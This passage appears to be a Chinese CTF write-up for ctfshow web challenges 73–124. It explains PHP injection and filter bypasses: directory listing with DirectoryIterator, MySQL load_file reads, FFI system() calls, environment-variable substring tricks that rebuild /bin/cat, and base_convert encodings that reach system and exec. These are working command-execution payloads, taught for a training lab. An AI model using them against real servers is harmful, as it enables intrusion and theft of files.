re></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403171847531.png" alt="image-20220403171847531"></p><h1 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查位置</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">c=include(&quot;/flagc.txt&quot;);exit(0);</span><br><span class="line">c=require(&quot;/flagc.txt&quot;);exit(0);</span><br><span class="line">c=require_once(&quot;/flagc.txt&quot;);exit(0);</span><br></pre></td></tr></table></figure><h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><h2 id="利用mysql-load-file读取文件"><a href="#利用mysql-load-file读取文件" class="headerlink" title="利用mysql load_file读取文件"></a>利用mysql load_file读取文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查位置</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><p>利用mysql load_file读取文件,但是用户名密码怎么知道的?</p><h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位置</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位置</span><br><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);</span><br><span class="line"></span><br><span class="line">c=$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);</span><br><span class="line"></span><br><span class="line">接着访问1.txt</span><br></pre></td></tr></table></figure><h1 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h1><h2 id="环境变量构造nl命令"><a href="#环境变量构造nl命令" class="headerlink" title="环境变量构造nl命令"></a>环境变量构造nl命令</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181813720.png" alt="image-20220403181813720"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403181913365.png" alt="image-20220403181913365"></p><p>fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184156712.png"></p><p>发现只有大写A-Z和${}~.?:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux</span><br><span class="line">echo $&#123;PWD&#125;#/root</span><br><span class="line">echo $&#123;PWD:0:1&#125;#/表示从0下标开始的第一个字符</span><br><span class="line">echo $&#123;PWD:~0:1&#125;#t表示从结尾开始往前的第一个字符</span><br><span class="line">echo $&#123;PWD:~0&#125;#t</span><br><span class="line">echo $&#123;PWD:~A&#125;#t字母和0具有同样作用</span><br><span class="line">echo $&#123;PWD:~A&#125;#/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure><p>利用环境变量构造nl命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$IFS????.???</span><br><span class="line">$&#123;PATH:~A&#125;-&gt;n</span><br><span class="line">$&#123;PWD:~A&#125;-&gt;l</span><br><span class="line">$IFS空格</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403184225406.png" alt="image-20220403184225406"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHLVL是记录多个Bash进程实例嵌套深度的累加器,进程第一次打开shell时,$&#123;SHLVL&#125;=1,然后在此shell中在打开一个shell是$&#123;SELVL&#125;=2</span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;SHLVL&#125;&#125;就输出/</span><br><span class="line">$&#123;#&#125;是0</span><br><span class="line">$&#123;SHLVL&#125;是1</span><br><span class="line">$&#123;#PWD&#125;是回显字符数,$&#123;PWD&#125;是/root,$&#123;#PWD&#125;是5</span><br><span class="line">#$&#123;RANDOM&#125;是随机数，$&#123;#RANDOM&#125;一般是5，也可能是4</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PATH:$&#123;#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125; ?$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span><br><span class="line"></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403190816534.png" alt="image-20220403190816534"></p><h1 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h1><p>fuzz一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403191727568.png" alt="image-20220403191727568"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;?$&#123;USER:~$&#123;PHP_VERSION:~A&#125;:$&#123;PHP_VERSION:~A&#125;&#125; ????.???</span><br><span class="line"># pwd=/var/www/html</span><br><span class="line"># USER=www-data</span><br><span class="line"># payload即为 /???/?at ????.???</span><br><span class="line">为了构造/bin/cat </span><br><span class="line"></span><br><span class="line">也可以只要a进行构造</span><br><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><span class="line">/???/?a? ????.???</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403191227821.png" alt="image-20220403191227821"></p><h1 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>给了源码,和上面差不多</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403192038212.png" alt="image-20220403192038212"></p><h1 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这次只剩下${PWD}了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;#?&#125;&#125;?? ????.???</span><br><span class="line"></span><br><span class="line">/???/r?? ????.???</span><br><span class="line">/bin/rev从最后一个字符显示到第一个字符</span><br><span class="line"></span><br><span class="line">$&#123;?&#125; 是0$?是表示上一条命令执行结束后的传回值,通常0代表执行成功,非零代表执行有误</span><br><span class="line">$&#123;#?&#125; 是1</span><br><span class="line">$&#123;#IFS&#125; 是3</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403192410977.png" alt="image-20220403192410977"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403192515170.png" alt="image-20220403192515170"></p><h1 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><p>要多试几次哦</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403192937127.png" alt="image-20220403192937127"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403193043855.png" alt="image-20220403193043855"></p><h1 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h1><h2 id="base-convert-函数"><a href="#base-convert-函数" class="headerlink" title="base_convert()函数"></a>base_convert()函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;<span class="comment">#如果没有设置c参数就显示源码</span></span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];<span class="comment">#将得到的c赋给</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;<span class="comment">#要是长度大于80就输出</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];<span class="comment">#黑名单</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;<span class="comment">#m表示多行匹配</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);<span class="comment">#匹配完的结果放到funcs数组里面,这里的preg_match_all将匹配到的元素放在一层数组里面</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">#如果不在数组里</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);<span class="comment">#eval输出c</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个匹配规则能过的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abs(1)匹配出abs能过</span><br><span class="line">1abs()匹配出abs能过</span><br><span class="line">absa()匹配出absa不能过</span><br><span class="line">abs(a)匹配出abs和a,a不在不能过</span><br><span class="line">abs()a匹配出abs和a,a不在不能过</span><br></pre></td></tr></table></figure><p><strong>思路一</strong></p><p>拼接裁剪的方式,首先不能加入其他的字符,只能使用上面的字符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=hypot.min.fmod;$pi=$pi&#123;2&#125;.$pi&#123;0&#125;.$pi&#123;2&#125;.$pi&#123;6&#125;.$pi&#123;7&#125;.$pi&#123;8&#125;.$pi&#123;3&#125;;$pi()</span><br></pre></td></tr></table></figure><p>这段payload分为三部分,</p><ul><li>首先定义一个变量名$pi,因为pi在白名单中最短,其值为phpot.min.fmod,因为hypot min fmod均在白名单中,而且phpinfo中的所有字符均可以在其中找到</li><li>然后从hypot.min.fmod中分别取第2 0 2 6 7 8 3位置的字符,拼接成phpinfo字符串,并重新赋值给$pi变量</li><li>最后执行$pi(),即执行phpinfo()函数.</li></ul><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403193413144.png" alt="image-20220403193413144"></p><p>但是根据这个思路去getflag,怎么也会超过长度</p><p>那么就需要去观察函数了</p><p>而其中的关键是base_convert()函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert() 函数在任意进制之间转换数字。</span><br><span class="line">语法</span><br><span class="line">base_convert(number,frombase,tobase);</span><br><span class="line"></span><br><span class="line">参数 描述</span><br><span class="line">number 必需。规定要转换的数。</span><br><span class="line">frombase 必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">tobase 必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">技术细节</span><br><span class="line">返回值： number 转换为指定进制。</span><br><span class="line">返回类型： String</span><br><span class="line">PHP 版本： 4+</span><br></pre></td></tr></table></figure><p>这里可以使用16进制,还可以使用36进制,可以带上所有小写字母</p><p>36进制,是数据的一种表示方式,同我们日常生活中的表示方法不一样,它由0-9,a-z组成,字母不区分大小写,与十进制对应的关系是0-9对应0-9,a-z对应10-35</p><p>那么接下来我们就可以进行转换了,既然字母会有过滤我们就可以将字母转换成十进制的数字,在使用baseconvert(10,36)转换回来</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;phpinfo&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">#55490343972</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="number">55490343972</span>,<span class="number">10</span>,<span class="number">36</span>);</span><br><span class="line"><span class="comment">#phpinfo</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(55490343972,10,36)()</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403193549866.png" alt="image-20220403193549866"></p><p>接着我们使用system(‘ls’),这里因为不能转换()和’’只能转换字母</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;ls&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">#1751504350</span></span><br><span class="line"><span class="comment">#784</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=base_convert(1751504350,10,36)(base_convert(784,10,36))</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403193642173.png" alt="image-20220403193642173"></p><p>接下来就是读取flag了,如果直接使用读取文件的函数file_get_contents中包含下划线,不在我们36进制之中,并且base_convert()的第一个参数太长会溢出,也就是10进制数没法无限大</p><p><strong>思路二</strong></p><p>借助getallheader()来控制请求头,通过请求头字段读取flag.php.这里也就类似于get,post之类的,但是只能控制小写字符,所以大写的直接被pass掉.getallheader()返回的是数组,要从数组里面取数据用array[‘xxx’].但是[]被waf了,因为{}中是可以带数字的,这里用getallheader(){1}可以分会自定义头1里面的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert,$pi(696468,10,36)(($pi(8768397090111664438,10,30))()&#123;1&#125;)</span><br><span class="line">#exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure><p><strong>exec()</strong> 执行   <code>command</code> 参数所指定的命令。  </p><p>base_convert(696468,10,36); 代表把696468从10进制转换为36进制，结果为exec。</p><p>base_convert(8768397090111664438,10,30);  代表把8768397090111664438从10进制转换为30进制，结果为getallheaders。注意这里不能用36进制，因为getallheaders的36进制转换为10进制后数太长会溢出，也就是无法把10进制数变回getallheader。所以我们在这里采用30进制。（当然这是在linux下使用php7.3版本的结果，如果是在windows下php7.0前的所有版本对于getallheader进行30-36的进制转换，再转换回来的时候都存在溢出，也就是无法把10进制数变回getallheader）</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203141211795.png" alt="image-20220314121125721"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403194216727.png" alt="image-20220403194216727"></p><p><strong>思路三</strong></p><p>使用system(nl*)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=($pi=base_convert)(1751504350,10,36)($pi(1438255411,14,34)(dechex(1852579882)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36) --------&gt;system</span><br><span class="line"></span><br><span class="line">$pi(1438255411,14,34) ------&gt;hex2bin</span><br><span class="line"></span><br><span class="line">dechex(1852579882) -----&gt;将十进制转为十六进制：6e6c202a（字符串形式是：nl *）</span><br><span class="line"></span><br><span class="line">nl *可以读取当前目录下的所有文件；</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220403201152980.png" alt="image-20220403201152980"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf.show </tag>
            
